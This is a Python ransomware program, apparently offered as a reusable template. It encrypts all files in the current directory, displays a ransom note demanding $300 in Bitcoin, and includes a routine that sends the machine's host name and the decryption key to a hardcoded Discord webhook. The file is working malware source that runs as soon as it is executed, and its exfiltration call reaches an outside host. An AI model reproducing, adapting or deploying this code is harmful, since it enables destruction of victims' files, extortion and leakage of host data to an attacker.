
import time
import os
from os.path import exists as file_exists
import socket
from cryptography.fernet import Fernet
from discord_webhook import DiscordWebhook, DiscordEmbed

class ransomware:
    def __init__(self):
        self.files_to_encrypt = []
        self.KeyStore = []
        self._keyEncrypt = Fernet.generate_key()
        self.dc_webhook = DiscordWebhook("https://discord.com/api/webhooks/978619729176567879/p5RU8Wak-m83cP78Giu3vcdtpKgXrQJD6iICXcc3rZyu4OgDtx3MHS1VBXsffg4lDzUl")
        self.wallet_url = "YOUR WALLET URL"
        self.priceToAsk = "$300"
        self.currency = "Bitcoin"

    def encrypt_files(self):
        classRedirect = ransomware()
        check = file_exists("encryptionCheck.txt")
        if check == True:
            print("Don't Encrypt Again")
            time.sleep(1.5)
            os.system("cls")
            classRedirect.encrypt_success()
        elif check == False:
            print("YES ENCRYPT ! ")
            print("Creation...")
            f = open("encryptionCheck.txt", "w+")
            for all_file in os.listdir():
                if all_file == "ransomware.py":
                    continue
                if os.path.isfile(all_file):
                    self.files_to_encrypt.append(all_file)
            for all_file in self.files_to_encrypt:
                with open(all_file, "rb") as newFile:
                    data = newFile.read()
                data_encrypted = Fernet(self._keyEncrypt).encrypt(data)
                with open(all_file, "wb") as newFile:
                    newFile.write(data_encrypted)
                    os.system("cls")
                    classRedirect.encrypt_success()
   
    def encrypt_success(self):
        while True:
            print(f"""
            .                                                      .
            .n                   .                 .                  n.
    .   .dP                  dP                   9b                 9b.    .
    4    qXb         .       dX                     Xb       .        dXp     t
    dX.    9Xb      .dXb    __                         __    dXb.     dXP     .Xb
    9XXb._       _.dXXXXb dXXXXbo.                 .odXXXXb dXXXXb._       _.dXXP
    9XXXXXXXXXXXXXXXXXXXVXXXXXXXXOo.           .oOXXXXXXXXVXXXXXXXXXXXXXXXXXXXP
    `9XXXXXXXXXXXXXXXXXXXXX'~   ~`OOO8b   d8OOO'~   ~`XXXXXXXXXXXXXXXXXXXXXP'
        `9XXXXXXXXXXXP' `9XX'   DIE    `98v8P'  HUMAN   `XXP' `9XXXXXXXXXXXP'
            ~~~~~~~       9X.          .db|db.          .XP       ~~~~~~~
                            )b.  .dbo.dP'`v'`9b.odb.  .dX(
                        ,dXXXXXXXXXXXb     dXXXXXXXXXXXb.
                        dXXXXXXXXXXXP'   .   `9XXXXXXXXXXXb
                        dXXXXXXXXXXXXb   d|b   dXXXXXXXXXXXXb
                        9XXb'   `XXXXXb.dX|Xb.dXXXXX'   `dXXP
                        `'      9XXXXXX(   )XXXXXXP      `'
                                XXXX X.`v'.X XXXX
                                XP^X'`b   d'`X^XX
                                X. 9  `   '  P )X
                                `b  `       '  d'
                                `             '

                    All Of Your Files Have Been Encrypted !
        Send {self.priceToAsk} In {self.currency} To This Wallet Address To Get The Decrypt Key !
                    Address: {self.wallet_url}

        Once It Done, Contact Me On Telegram To Get The Decrypt Key.
        Telegram: @YourTelegramName
            """)

            decryption_key_input = input("Enter The Decryption Key: ")
        

    def decrypt_files(self, decryption_key_input):
            for all_file in self.files_to_encrypt:
                with open(all_file, "rb") as newFile:
                    data = newFile.read()
                data_decrypted = Fernet(decryption_key_input).decrypt(data)
                with open(all_file, "wb") as newFile:
                    newFile.write(data_decrypted)

    def key_gen(self):
        print(self._keyEncrypt)
        self.KeyStore.append(self._keyEncrypt)
        print(self.KeyStore)
        print(self.files_to_encrypt)
        # Sending decrypting key to your discord webhook
        hostname = socket.gethostname()

        embed = DiscordEmbed(description=f'> All information(s) about **"hostname"** and **"decryption key"** to be sure each keys correspond to each user(s). \r\r **\💻 ・ Host Name: **\n `{hostname}` \r\r **\🔐・ Decryption Key : **\n ||`{self._keyEncrypt}`||', color='ff5c5c')
        embed.set_author(name='RansomWare - By Zaqo')
        embed.set_footer(text='Ransomware - Python By Zaqo')
        embed.set_thumbnail(url='https://cdn.discordapp.com/attachments/972673497631424622/978628076470665256/Background_21.png')

        self.dc_webhook.add_embed(embed)
        response = self.dc_webhook.execute()

w = ransomware()
w.encrypt_files()
            

